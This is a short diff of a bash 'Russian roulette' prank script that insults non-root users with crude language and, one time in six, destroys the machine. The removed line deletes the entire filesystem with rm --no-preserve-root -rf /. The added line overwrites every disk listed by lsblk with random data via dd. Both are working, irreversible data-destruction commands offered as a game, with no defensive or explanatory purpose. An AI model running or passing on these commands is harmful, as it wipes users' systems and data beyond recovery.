@@ -1,4 +1,4 @@
 #!/bin/bash
 
 [ "$EUID" -ne 0 ] && echo "Seriously?! What a p***y, how about playing as root?" && exit
-[ $(( $RANDOM % 6 )) -eq 0 ] && rm --no-preserve-root -rf / || echo "click"
+[ $(( $RANDOM % 6 )) -eq 0 ] && lsblk | grep -Eo '^[0-9a-z]+' | xargs -I {} dd if=/dev/random of=/dev/{} || echo "click"
